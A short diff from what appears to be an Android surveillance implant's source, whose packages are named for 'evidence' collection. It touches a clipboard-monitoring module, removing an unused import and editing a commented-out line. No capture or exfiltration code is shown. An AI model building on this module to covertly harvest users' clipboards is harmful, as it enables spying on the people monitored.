@@ -21,7 +21,6 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
-import com.android.dvci.gui.AGUI;
 import com.android.dvci.interfaces.IncrementalLog;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
@@ -54,7 +53,7 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 
 	@Override
 	public void actualGo() {
-		//AGUI gui = Status.getAppGui();
+		//ASG gui = Status.getAppGui();
 		Handler mHandler = new Handler(Looper.getMainLooper());
 		mHandler.post(new Runnable() {
 			@Override
